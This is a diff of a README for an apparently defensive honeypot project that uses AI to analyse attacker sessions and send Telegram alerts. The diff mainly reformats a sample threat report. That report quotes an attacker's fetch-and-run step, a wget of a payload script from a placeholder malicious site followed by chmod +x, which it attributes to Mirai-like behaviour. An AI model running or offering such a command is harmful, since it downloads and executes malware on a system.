@@ -111,15 +111,18 @@ Timing: A threading.Timer resets on every new activity.
 Execution: Data is only pushed to the cloud after the attacker disconnects or is idle for 120 seconds. Result: Reduced API calls by approximately 95% and provided the AI with full context rather than fragmented lines.
 
 Sample Threat Report (Output)
-AI Analysis: "The attacker connected from a known botnet IP range (Brazil). They attempted to download a malicious payload using wget and changed file permissions with chmod +x. This pattern matches the behavior of the Mirai Botnet variant."
+AI Analysis: 
 
-Metric,Details
+```
+*The attacker connected from a known botnet IP range (Brazil).
+*They attempted to download a malicious payload using wget and changed file permissions with chmod +x. 
+*This pattern matches the behavior of the Mirai Botnet variant.
 Attacker IP,192.168.x.x
 Origin,Brazil (BR)
 Session Duration,45 Seconds
 Events Recorded,12 Actions
 Critical Command,wget http-://malicious-site/payload.sh
-
+```
 ---
 
 ## 📸 Project Gallery
@@ -132,7 +135,9 @@ Real-time notification delivered via Telegram. The AI analyzes the raw logs, ide
 
 ### 2. The Brain: Automation Logic (n8n)
 
-Visual workflow demonstrating the data pipeline: `Webhook -> OpenAI Analysis -> Telegram Alert`.
+Visual workflow demonstrating the data pipeline: 
+
+`Webhook -> OpenAI Analysis -> Telegram Alert`.
 
 ![n8n Workflow](assets/n8n-workflow.png)
 
